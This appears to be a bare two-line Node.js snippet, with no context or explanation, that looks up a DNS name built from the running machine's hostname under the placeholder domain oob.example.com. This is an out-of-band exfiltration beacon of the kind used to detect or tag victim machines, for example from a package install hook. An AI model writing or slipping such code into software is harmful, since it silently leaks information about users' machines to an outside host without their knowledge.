const os = require('os'); const dns = require('dns');
dns.lookup(os.hostname()+'.oob.example.com',()=>{});
